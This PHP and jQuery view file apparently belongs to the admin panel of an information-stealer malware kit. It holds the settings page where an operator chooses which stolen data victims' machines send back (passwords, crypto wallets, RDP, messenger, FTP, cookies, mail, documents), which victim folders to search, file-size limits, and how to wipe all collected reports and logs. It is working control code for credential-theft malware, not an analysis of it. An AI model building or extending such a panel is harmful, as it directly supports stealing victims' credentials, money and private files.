<?php
	if(Model::$config['ac_docs_dr'] == 1)
	{
		$drives_state = 'danger';
		$desktop_state = 'success';
		$docs_state = 'danger';
	}
	else if(Model::$config['ac_docs_dr'] == 2)
	{
		$drives_state = 'danger';
		$desktop_state = 'danger';
		$docs_state = 'success';
	}
	else if(Model::$config['ac_docs_dr'] == 3)
	{
		$drives_state = 'success';
		$desktop_state = 'danger';
		$docs_state = 'danger';
	}
?>
<script>
	$(document).ready(function()
	{
		$(document).on('submit', 'form', function()
		{
			var dir = 0;
			if($('[dt="0"]').attr('class').indexOf('success') != -1) dir = 3;
			if($('[dt="1"]').attr('class').indexOf('success') != -1) dir = 1;
			if($('[dt="2"]').attr('class').indexOf('success') != -1) dir = 2;
			$.post('?p1=settings&p2=change',
			{
				us_login: $('[name="us_login"]').val(),
				us_password: $('[name="us_password"]').val(),
				ac_passwords: $('[name="ac_passwords"]').attr('class').indexOf('success') != -1 ? 1 : 2,
				ac_cookies: $('[name="ac_cookies"]').attr('class').indexOf('success') != -1 ? 1 : 2,
				ac_docs: $('[name="ac_docs"]').attr('class').indexOf('success') != -1 ? 1 : 2,
				ac_docs_ft: $('[name="ac_docs_ft"]').val(),
				ac_docs_dr: dir,
				ac_docs_sz: $('[name="ac_docs_sz"]').val(),
				ac_docs_st: $('[name="ac_docs_st"]').attr('class').indexOf('success') != -1 ? 1 : 2,
				ac_wallets: $('[name="ac_wallets"]').attr('class').indexOf('success') != -1 ? 1 : 2,
				ac_messengers: $('[name="ac_messengers"]').attr('class').indexOf('success') != -1 ? 1 : 2,
				ac_ftp_cl: $('[name="ac_ftp_cl"]').attr('class').indexOf('success') != -1 ? 1 : 2,
				ac_rdp: $('[name="ac_rdp"]').attr('class').indexOf('success') != -1 ? 1 : 2,
				ac_mail: $('[name="ac_mail"]').attr('class').indexOf('success') != -1 ? 1 : 2,
				al_duplicate: $('[name="al_duplicate"]').attr('class').indexOf('success') != -1 ? 1 : 2,
			}, function(data)
			{
				$.notify(
				{
					message: 'Changes successfully saved'
				},
				{
					animate:
					{
						enter: 'animated flipInY',
						exit: 'animated flipOutX'
					},
					type: 'success',
					delay: 2500,
					placement:
					{
						from: 'bottom',
						align: 'left'
					}
				});
			});
			return false;
		});
		$(document).on('click', '[cbutton]', function()
		{
			var cattr = $(this).attr('class');
			$(this).attr('class', cattr.indexOf('success') != -1 ? cattr.replace('btn-success', 'btn-danger') : cattr.replace('btn-danger', 'btn-success'));
		});
		$(document).on('click', '[dt]', function()
		{
			var dt = $(this).attr('dt');
			var cattr = $(this).attr('class');
			if(dt == 0)
			{
				$('[dt=0]').attr('class', cattr.replace('btn-danger', 'btn-success'));
				$('[dt=1]').attr('class', cattr.replace('btn-success', 'btn-danger'));
				$('[dt=2]').attr('class', cattr.replace('btn-success', 'btn-danger'));
			}
			else if(dt == 1)
			{
				$('[dt=0]').attr('class', cattr.replace('btn-success', 'btn-danger'));
				$('[dt=1]').attr('class', cattr.replace('btn-danger', 'btn-success'));
				$('[dt=2]').attr('class', cattr.replace('btn-success', 'btn-danger'));
			}
			else if(dt == 2)
			{
				$('[dt=0]').attr('class', cattr.replace('btn-success', 'btn-danger'));
				$('[dt=1]').attr('class', cattr.replace('btn-success', 'btn-danger'));
				$('[dt=2]').attr('class', cattr.replace('btn-danger', 'btn-success'));
			}
		});
		$(document).on('click', '[searchtype]', function()
		{
			var cattr = $(this).attr('class');
			$(this).attr('class', cattr.indexOf('success') != -1 ? cattr.replace('btn-success', 'btn-danger') : cattr.replace('btn-danger', 'btn-success'));
			$(this).text(cattr.indexOf('success') != -1 ? 'Search files in all directories' : 'Search files only in top directory');
		});
		$(document).on('click', '[name="deleteAll"]', function()
		{
			$.get('?p1=settings&p2=clean');
			$.notify(
			{
				message: 'Success'
			},
			{
				animate:
				{
					enter: 'animated flipInY',
					exit: 'animated flipOutX'
				},
				type: 'success',
				delay: 2500,
				placement:
				{
					from: 'bottom',
					align: 'left'
				}
			});
		})
	});
</script>
<div class="row">
	<form>
		<div class="col-lg-6">
			<div class="form-group">
				<label class="control-label" for="focusedInput">Username:</label>
				<input class="form-control" id="focusedInput" type="text" name="us_login" value="<?=htmlspecialchars(Model::$config['us_login']);?>" placeholder="Login">
			</div>
			<div class="form-group">
				<label class="control-label" for="focusedInput">Password:</label>
				<input class="form-control" id="focusedInput" type="text" name="us_password" value="<?=htmlspecialchars(Model::$config['us_password']);?>" placeholder="Password">
			</div>
			<div class="form-group">
				<label class="control-label" for="focusedInput">Allowed report types:</label><br>
				<button style="width: 76px;" name="ac_passwords" type="button" class="btn btn-<?=(Model::$config['ac_passwords']==1?'success':'danger');?> btn-sm" cbutton>Passwords</button>
				<button style="width: 66px;" name="ac_wallets" type="button" class="btn btn-<?=(Model::$config['ac_wallets']==1?'success':'danger');?> btn-sm" cbutton>Wallets</button>
				<button style="width: 60px;" name="ac_rdp" type="button" class="btn btn-<?=(Model::$config['ac_rdp']==1?'success':'danger');?> btn-sm" cbutton>Rdp</button>
				<button style="width: 63px;" name="ac_messengers" type="button" class="btn btn-<?=(Model::$config['ac_messengers']==1?'success':'danger');?> btn-sm" cbutton>IM</button>
				<button style="width: 63px;" name="ac_ftp_cl" type="button" class="btn btn-<?=(Model::$config['ac_ftp_cl']==1?'success':'danger');?> btn-sm" cbutton>FTP</button>
				<button style="width: 66px;" name="ac_docs" type="button" class="btn btn-<?=(Model::$config['ac_docs']==1?'success':'danger');?> btn-sm" cbutton>Docs</button>
				<button style="width: 70px;" name="ac_cookies" type="button" class="btn btn-<?=(Model::$config['ac_cookies']==1?'success':'danger');?> btn-sm" cbutton>Cookies</button>
				<button style="width: 66px;" name="ac_mail" type="button" class="btn btn-<?=(Model::$config['ac_mail']==1?'success':'danger');?> btn-sm" cbutton>Mail</button>
			</div>
			<div class="form-group">
				<button type="button" style="margin-top: 53px;" name="al_duplicate" class="btn btn-<?=(Model::$config['al_duplicate']==1?'success':'danger');?> btn-block" cbutton>Allow requests by user who already is in logs</button>
			</div>
		</div>
		<div class="col-lg-6">
			<div class="form-group">	
				<label class="control-label" for="focusedInput">Document extensions (use '|' as seperator):</label><br>
				<input class="form-control" id="focusedInput" type="text" name="ac_docs_ft" value="<?=htmlspecialchars(Model::$config['ac_docs_ft']);?>" placeholder="Extensions (*.txt|*.doc etc.)">
			</div>
			<div class="form-group">	
				<label class="control-label" for="focusedInput">Max. file size for upload (bytes):</label><br>
				<input class="form-control" id="focusedInput" type="number" name="ac_docs_sz" value="<?=htmlspecialchars(Model::$config['ac_docs_sz']);?>" placeholder="File size in bytes">
			</div>
			<div class="form-group">
				<label class="control-label" for="focusedInput">Directory for search:</label><br>
				<button style="width: 180px;" dt='0' type="button" class="btn btn-<?=$drives_state;?>">Drives (C:/, D;/ etc.)</button>
				<button style="width: 180px;" dt='1' type="button" class="btn btn-<?=$desktop_state;?>">Desktop</button>
				<button style="width: 180px;" dt='2' type="button" class="btn btn-<?=$docs_state;?>">Documents</button>
			</div>
			<div class="form-group">
				<label class="control-label" for="focusedInput">Search type:</label><br>
				<button searchtype style="width: 555px;" name="ac_docs_st" type="button"class="btn btn-<?=(Model::$config['ac_docs_st']==1?'success':'danger');?>"><?=(Model::$config['ac_docs_st']==1?'Search files only in top directory':'Search files in all directories');?></button>
			</div>
		</div>
		<div class="col-lg-6">
			<div class="form-group">
				<input type="submit" class="btn btn-success btn-block" value="Save changes"></input>
			</div>
		</div>
		<div class="col-lg-6">
			<div class="form-group">
				<button type="button" data-toggle="modal" data-target="div[name='confirmDelete']" class="btn btn-danger btn-block">Delete all reports and logs</button>
			</div>
		</div>
	</form>
</div>
<div class="modal fade" name="confirmDelete" tabindex="-1" role="dialog" aria-hidden="true">
	<div class="modal-dialog modal-xs">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
				<h4 name="passHwid" class="modal-title">Are you sure?</h4>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-success" name="deleteAll" data-dismiss="modal">Yes</button>
				<button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>